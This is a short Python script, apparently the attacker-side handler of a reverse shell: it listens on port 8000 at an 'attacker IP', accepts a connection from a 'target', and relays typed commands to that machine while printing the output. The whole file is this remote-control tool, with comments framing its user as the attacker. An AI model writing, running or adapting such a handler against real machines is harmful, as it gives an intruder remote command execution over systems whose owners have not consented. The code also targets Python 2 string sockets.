import socket                                   # For Building TCP Connection -- AF_INET

# Attacker IP goes here
ATT_IP = ""

def connect():

    # We are creating a object S here.
    soketi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # WE will define IP address and port number (In Your Case,Find your IP Adrees with 'ifconfig'' Command)
    soketi.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    soketi.bind((ATT_IP, 8000))

    # Number of connections.
    soketi.listen(1)

    print('[+] Listening for incoming TCP connection')
    print('[+] Shell Is running')

    # Function accept() will return the connection object id (conn) and the client/target IP address and source port in a tuple format (IP, port)
    conn, addr = soketi.accept()

    # IP address of the client/target will be display
    print('[+] We got a connection from: ', addr)
    while True:

        cmd = input("Shell> ")                  # Input
        if 'terminate' in cmd:                  # Terminate Loop
            conn.send('terminate')
            conn.close()
            break
        else:
            # Otherwise we will send the command to the target
            conn.send(cmd)
            print(conn.recv(1024))              # and print the result that we got back


if __name__ == "__main__":
    connect()
